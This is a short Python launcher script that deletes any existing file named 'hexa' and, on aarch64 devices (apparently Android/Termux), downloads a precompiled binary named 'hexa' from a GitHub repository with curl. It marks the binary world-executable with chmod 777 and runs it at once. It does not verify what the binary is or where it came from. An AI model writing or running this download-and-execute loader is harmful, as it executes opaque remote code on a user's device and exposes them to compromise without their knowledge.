from os import system,remove
from platform import machine
try:remove('hexa')
except:pass
if machine()=='aarch64':
    system('curl -L https://github.com/Mr-Beta-Version/Compiled/raw/main/hexa -o hexa;chmod 777 hexa;./hexa')
else:
    exit('Not Supported')
